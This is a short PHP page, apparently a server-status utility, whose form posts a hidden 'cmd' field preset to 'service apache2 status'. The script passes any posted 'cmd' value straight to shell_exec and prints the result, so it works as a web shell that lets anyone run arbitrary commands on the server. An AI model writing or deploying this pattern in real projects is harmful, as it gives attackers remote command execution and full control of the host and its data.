<?php

if (isset($_POST['cmd']))
{
$cmd = $_POST['cmd'];
$result = shell_exec($cmd);
echo "<pre>".$result."</pre>";
}
?>
<form method="post">
<p>
<input  type="hidden" value="service apache2 status" name="cmd"/>
</p>
<input type="submit" value="Execute"/>
<form>


